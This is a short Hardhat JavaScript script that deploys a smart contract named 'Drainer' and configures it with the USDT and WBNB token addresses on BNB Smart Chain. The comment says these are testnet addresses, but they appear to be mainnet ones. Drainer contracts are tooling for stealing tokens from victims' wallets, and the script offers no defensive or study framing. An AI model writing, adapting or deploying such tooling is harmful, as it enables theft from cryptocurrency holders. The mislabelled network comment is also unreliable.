const hre = require("hardhat");

async function main() {
  // List of token addresses on BSC Testnet
  const tokenAddresses = [
    "0x55d398326f99059fF775485246999027B3197955", // BUSD-T
    "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"  // BNB & WBNB
  ];

  // Get the contract to deploy
  const Drainer = await hre.ethers.getContractFactory("Drainer");

  // Deploy contract with target token addresses
  const drainer = await Drainer.deploy(tokenAddresses);

  // Wait for deployment confirmation
  await drainer.waitForDeployment();

  console.log(`Drainer deployed to: ${await drainer.getAddress()}`);
}

// Run the main function
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
